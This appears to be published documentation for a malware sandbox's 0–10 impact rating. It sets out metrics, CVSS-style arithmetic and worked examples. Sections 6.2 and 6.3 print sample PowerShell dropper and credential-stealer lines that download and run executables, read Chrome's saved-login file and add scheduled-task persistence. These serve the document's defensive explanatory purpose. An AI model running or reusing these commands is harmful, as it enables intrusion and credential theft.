# The Cyclowareness Impact Rating (CIR v1)

The published rubric for the 0–10 severity number on every Cyclowareness Sandbox
report. Every metric, every value, the exact condition under which the engine
selects it, and worked examples you can reproduce.

This document exists so that the rating can be **audited rather than trusted**.
If you disagree with a rating, this page tells you precisely which line of
evidence produced it and which rule turned that evidence into a letter.

Implementation: [`backend/app/engine/impact.py`](../backend/app/engine/impact.py).
Capability taxonomy: [`backend/app/engine/capabilities.py`](../backend/app/engine/capabilities.py).

---

## 1. What it is, and what it is not

**It is** a severity rating for the *capability* an analysed sample was observed
to have: how reachable it is, how reliably it runs, what it needs from the user,
whether it acts beyond its own process, and what it can do to confidentiality,
integrity and availability.

**It is not a vulnerability score, and it is not CVSS.**

CVSS is scoped by FIRST to vulnerabilities — "the principal technical
characteristics of software, hardware and firmware vulnerabilities" (FIRST, CVSS
v3.1 Specification). A malware sample is not a vulnerability. Earlier releases of
this product published this number as "CVSS v3.1". The arithmetic was exactly
right — verified against six of the specification's own worked vectors — but
correct arithmetic on a category error is still a category error, and being
precisely wrong is worse than being approximately right. CVSS v4.0 has also been
generally available since November 2023, so a "CVSS v3.1" badge in 2026 invites a
question with no good answer.

So the name changed and the maths did not.

**The arithmetic is deliberately CVSS-compatible.** The metric value tables, the
scope-dependent impact and exploitability equations and the `roundup` function are
the CVSS v3.1 ones, reproduced in section 5. Two reasons: an analyst who knows
what an 8.8 feels like reads a CIR 8.8 correctly on the first try, and the
equations are public, so anyone can recompute our number from our vector and
check that we did not put a thumb on the scale.

### Where real CVSS belongs

Nothing here forecloses real CVSS. If an analyzer identifies an actual CVE in a
sample — an exploit for a known vulnerability, a vulnerable bundled component —
that finding belongs in its own field carrying the genuine CVSS vector from the
CVE record. CIR rates what the sample can do. CVSS rates a vulnerability it
exploits. They are different statements about different objects and must never be
collapsed into one number.

---

## 2. Notation

```
CIR:1.0/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:H/A:L
```

The prefix is `CIR:1.0`, never `CVSS:3.1`. A vector carrying the CVSS prefix is a
claim to *be* CVSS, and a downstream tool that parses it as such would be entitled
to file the sample as a scored vulnerability. The eight metrics always appear in
the order `AV AC PR UI S C I A`.

Reports written before the rename still carry `CVSS:3.1/...` in their stored
vector. Those rows are left exactly as the engine wrote them — rewriting an old
record to match a new name would falsify it — and they still render. Re-analysing
the sample re-rates it as CIR.

---

## 3. Scale and bands

| Score | Severity |
|---|---|
| 0.0 | none |
| 0.1 – 3.9 | low |
| 4.0 – 6.9 | medium |
| 7.0 – 8.9 | high |
| 9.0 – 10.0 | critical |

**A rating of 0.0 is a real answer, not a missing one.** The rating describes an
impact; when the evidence demonstrates no capability at all there is no impact to
rate, and the engine returns `0.0 / none` rather than manufacturing a vector. An
earlier version granted Integrity:High to any file that produced a single
informational signal, which rated ordinary business documents at 7.x. That is the
failure this rule exists to prevent.

---

## 4. The metrics — every value and its exact condition

The engine does not read file bytes here. It reads **capabilities**: a fixed
taxonomy distilled from the signals the analyzers fired, listed in section 4.1.
Each metric below is a rule over that set. The rules are evaluated in the order
written; the first matching branch wins.

Every rating ships with a per-metric `rationale` array — metric, chosen value, and
the sentence explaining why — in the JSON export and on the report screen. The
sentences below are the ones the engine emits.

### 4.1 The capability vocabulary

A capability is something the sample **can do**, evidenced by an exact signal id
from an analyzer. Never a substring of prose, never a passive mention: a PDF that
contains a hyperlink has not communicated with anything; a document that fetches a
remote template on open has. Signals below `low` severity are facts, not
capabilities.

| Capability | Means |
|---|---|
| `execution` | The sample can cause code to run |
| `network` | The sample actively reaches out (download / C2) |
| `credential` | The sample reads secrets or personal data |
| `persistence` | The sample survives a reboot or re-runs itself |
| `evasion` | The sample hides from analysis or disables defences |
| `injection` | The sample loads or runs code that is not statically visible |
| `dropper` | The sample carries another executable payload |
| `privilege` | The sample abuses elevation or device-administration controls |
| `deception` | The sample disguises what it is |
| `destruction` | Destructive / ransomware behaviour |
| `exploit` | Exploitation of a vulnerability |
| `discovery` | Host reconnaissance |

`destruction`, `exploit` and `discovery` have **no static evidence** behind them
today: no analyzer produces static proof of them, and claiming either from
evidence we do not have is the dishonesty this engine refuses. They are populated
only by the dynamic tier, from a sample that was actually detonated.

### 4.2 Attack Vector (AV) — how the sample reaches the target

| Value | Selected when | Rationale emitted |
|---|---|---|
| `N` (Network) | `network` capability present, **or** the sample was submitted as a URL | "Reaches the network (download/C2) or was delivered by URL" |
| `L` (Local) | otherwise | "Requires the file to be run locally" |

`A` (Adjacent) and `P` (Physical) are defined in the arithmetic but never selected
by the current rules: static evidence cannot distinguish them from `N` or `L`
honestly.

### 4.3 Attack Complexity (AC) — how reliably it runs

| Value | Selected when | Rationale emitted |
|---|---|---|
| `H` (High) | `evasion` capability present | "Obfuscated / evasive — reliable execution is conditional" |
| `L` (Low) | otherwise | "No special conditions to run" |

Note the direction: heavy obfuscation **lowers** the score, because evasion makes
execution conditional on defeating the environment. This is counter-intuitive
until you remember the number rates reliable impact, not menace.

### 4.4 Privileges Required (PR)

| Value | Selected when | Rationale emitted |
|---|---|---|
| `N` (None) | always | "Runs with the executing user's privileges; none required beforehand" |

Malware runs as whoever executes it. There is no privilege it must hold in
advance, so this metric is `N` for every rated sample. It is kept in the vector
because the arithmetic needs it and because a future analyzer that can prove a
sample requires an administrator would have somewhere to say so.

### 4.5 User Interaction (UI)

| Value | Selected when | Rationale emitted |
|---|---|---|
| `R` (Required) | always | "The user must open or run the sample" |

A file in quarantine has not run. Something — a user opening a document, running a
script, launching an installer — has to happen first. Claiming `N` would rate
every sample as if it were self-propagating.

### 4.6 Scope (S) — the blast radius

| Value | Selected when | Rationale emitted |
|---|---|---|
| `C` (Changed) | `persistence` **or** `privilege` present | "Acts beyond the executing process (persistence / elevation abuse)" |
| `U` (Unchanged) | otherwise | "Impact contained to the executing context" |

Only things that genuinely act on components beyond the running sample change
scope. Obfuscation alone does not: plenty of legitimate software is packed, and
treating that as a scope change inflated every installer we tested.

Scope has the largest single effect on the number — it switches the equation set
and raises the privilege weights — so this rule is deliberately the narrowest one
in the rubric.

### 4.7 Confidentiality (C)

| Value | Selected when | Rationale emitted |
|---|---|---|
| `H` (High) | `credential` present | "Accesses credentials / device data / messages" |
| `L` (Low) | else `execution` **or** `injection` present | "Runs code that could read local data" |
| `N` (None) | otherwise | "No confidentiality impact demonstrated" |

The `L` branch is a deliberate concession: anything that can run code could in
principle read a file. It is `L`, not `H`, because "could" is not "does".

### 4.8 Integrity (I)

| Value | Selected when | Rationale emitted |
|---|---|---|
| `H` (High) | `execution`, `injection`, `persistence`, `dropper` **or** `exploit` present | "Runs or loads code, drops a payload, or persists" |
| `L` (Low) | else `deception` present | "Misrepresents what it is, but no code execution was demonstrated" |
| `N` (None) | otherwise | "No integrity impact demonstrated" |

Reaching the network is **not** on its own an integrity impact. A sample that
fetches something and does nothing with it has changed nothing.

### 4.9 Availability (A)

| Value | Selected when | Rationale emitted |
|---|---|---|
| `H` (High) | `destruction` present (dynamic tier only) | "Destructive / ransomware behaviour" |
| `L` (Low) | else `persistence` **and** `network` both present | "Resource use from persistent network activity" |
| `N` (None) | otherwise | "No availability impact observed" |

`A:H` is unreachable from static evidence alone by design — see section 4.1.

---

## 5. The arithmetic

Reproduced in full so the number can be recomputed by hand. These are the CVSS
v3.1 equations; only the label on the result differs.

**Metric weights**

| | N | A | L | P | H | R |
|---|---|---|---|---|---|---|
| AV | 0.85 | 0.62 | 0.55 | 0.20 | | |
| AC | | | 0.77 | | 0.44 | |
| PR (S:U) | 0.85 | | 0.62 | | 0.27 | |
| PR (S:C) | 0.85 | | 0.68 | | 0.50 | |
| UI | 0.85 | | | | | 0.62 |
| C / I / A | 0.00 | | 0.22 | | 0.56 | |

**Equations**

```
ISS            = 1 − (1 − C) · (1 − I) · (1 − A)

Impact         = 6.42 · ISS                                        if S:U
               = 7.52 · (ISS − 0.029) − 3.25 · (ISS − 0.02)^15     if S:C

Exploitability = 8.22 · AV · AC · PR · UI

Base           = 0                                                 if Impact ≤ 0
               = roundup(min(Impact + Exploitability, 10))         if S:U
               = roundup(min(1.08 · (Impact + Exploitability), 10)) if S:C
```

`roundup` rounds **up** to one decimal place, computed on scaled integers so that
floating-point representation cannot shift a result across a band boundary.

---

## 6. Worked examples

### 6.1 An ordinary business document — CIR 0.0 (none)

```
Meeting notes
- renew certificate
Docs: https://example.com/docs
```

Analyzers fire nothing above `info`. The URL is extracted as an IOC — it is a
fact about the file's contents — but a URL in text is not the `network`
capability: this file has not communicated with anything. **No capability is
demonstrated.**

The engine short-circuits: `0.0 / none`, with the single rationale line "No
capability was demonstrated by the evidence, so there is no impact to rate."

```
CIR:1.0/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:N   →   0.0  none
```

### 6.2 A PowerShell dropper — CIR 7.5 (high)

```powershell
$b='SQBFAFgA';IEX([Convert]::FromBase64String($b));
(New-Object Net.WebClient).DownloadFile('http://185.220.101.5/x.exe','a.exe')
schtasks /create /tn U /tr a.exe /f
```

Signals fired → capabilities:

| Signal | Capability |
|---|---|
| `script.encoded_command` | `execution` |
| `script.download_and_execute` | `execution`, `network` |
| `script.dynamic_execution` | `execution`, `injection` |
| `script.obfuscation_high` | `evasion` |
| `script.persistence` | `persistence` |

(`generic.ip_literal_url` and `yara.powershell_download_cradle` also fire. They
raise the risk score and they are in the report, but they assert no capability, so
they do not move the rating.)

Metric selection:

| Metric | Value | Rule |
|---|---|---|
| AV | `N` | `network` present (§4.2) |
| AC | `H` | `evasion` present (§4.3) |
| PR | `N` | always (§4.4) |
| UI | `R` | always (§4.5) |
| S | `C` | `persistence` present (§4.6) |
| C | `L` | no `credential`, but `execution` present (§4.7) |
| I | `H` | `execution` present (§4.8) |
| A | `L` | `persistence` and `network` both present (§4.9) |

Arithmetic (S:C):

```
ISS            = 1 − (1−0.22)(1−0.56)(1−0.22)            = 0.732304
Impact         = 7.52·(0.732304−0.029) − 3.25·(0.712304)^15 = 5.268808
Exploitability = 8.22 · 0.85 · 0.44 · 0.85 · 0.62        = 1.620146
Base           = roundup(1.08 · 6.888953) = roundup(7.440069) = 7.5
```

```
CIR:1.0/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:H/A:L   →   7.5  high
```

Read the `AC:H` carefully: the obfuscation is *why* this is 7.5 rather than 9.0.
Strip the encoding and the same dropper rates higher, because it becomes more
reliable.

### 6.3 An unobfuscated credential stealer — CIR 9.6 (critical)

```powershell
$data = Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
(New-Object Net.WebClient).DownloadFile("http://updates.example.com/stage2.exe", "$env:TEMP\s.exe")
Start-Process "$env:TEMP\s.exe"
schtasks /create /tn Sync /tr "$env:TEMP\s.exe" /sc onlogon /f
```

Signals fired: `script.credential_access`, `script.download_and_execute`,
`script.persistence` → capabilities `credential`, `execution`, `network`,
`persistence`.

| Metric | Value | Rule |
|---|---|---|
| AV | `N` | `network` (§4.2) |
| AC | `L` | no `evasion` — it makes no attempt to hide (§4.3) |
| PR | `N` | always (§4.4) |
| UI | `R` | always (§4.5) |
| S | `C` | `persistence` (§4.6) |
| C | `H` | `credential` (§4.7) |
| I | `H` | `execution` (§4.8) |
| A | `L` | `persistence` + `network` (§4.9) |

```
CIR:1.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L   →   9.6  critical
```

Compare with 6.2, which is *more* sophisticated and rates 2.1 points lower. The
difference is `AC`: this one runs first time, every time.

### 6.4 A renamed executable with nothing else — CIR 3.3 (low)

`invoice.pdf` whose content is actually a Windows PE, with no macro, no scripted
network activity and no packer section.

Signals fired: `generic.extension_mismatch`, `pe.imports.network`,
`pe.timestamp_anomaly`.

Only the first is a capability — `deception`. The other two are **facts, not
capabilities**: importing socket functions is what a great deal of ordinary
software does, and a linker timestamp is metadata. This is the distinction the
whole rubric turns on, and it is why this file rates 3.3 rather than 7-something.

| Metric | Value | Rule |
|---|---|---|
| AV | `L` | no `network` capability — imports are not activity (§4.2) |
| AC | `L` | no `evasion` (§4.3) |
| PR | `N` | always (§4.4) |
| UI | `R` | always (§4.5) |
| S | `U` | no `persistence` / `privilege` (§4.6) |
| C | `N` | no `credential`, no `execution` (§4.7) |
| I | `L` | `deception` only — it misrepresents itself but nothing was demonstrated to run (§4.8) |
| A | `N` | nothing (§4.9) |

```
CIR:1.0/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N   →   3.3  low
```

A file named `invoice.pdf` that is really an executable deserves attention, and
the risk score and the verdict give it that. What the *impact rating* says is
narrower and more useful: on this evidence alone, nobody has demonstrated what it
would do. Send it to the dynamic tier and find out.

---

## 7. Where the rating appears

The rating and the sentence stating what it is are carried on **every** surface,
from one shared constant, so the screen and the exported case file cannot drift
apart:

| Surface | Where |
|---|---|
| Report screen | "Cyclowareness Impact Rating" panel — score, vector, per-metric chips, rationale, disclaimer |
| JSON export | `impact` object: `rating`, `vector`, `base_score`, `severity`, `metrics`, `rationale`, `disclaimer` |
| PDF case file | "Threat classification and severity" section |
| STIX 2.1 bundle | a `note` object attached to the file observable, carrying the vector and the disclaimer |
| API | `impact` on `GET /api/result/{id}` |

The STIX form is deliberately a `note` and not an `indicator`: a note is an
annotation, and an indicator is an accusation that a threat-intelligence platform
would turn into a blocklist entry.

---

## 8. Reproducing a rating yourself

1. Take the `vector` from the report.
2. Look up each letter's weight in the table in section 5.
3. Apply the equations in section 5.
4. Compare against the `base_score`.

To audit the *metric selection* rather than the arithmetic, read the `rationale`
array beside the score: each entry names the metric, the value chosen and the
condition from section 4 that chose it. Then check that condition against the
`signals` array in the same export. Every rating in this product is a chain from a
named signal to a letter to a number, and every link is printed.
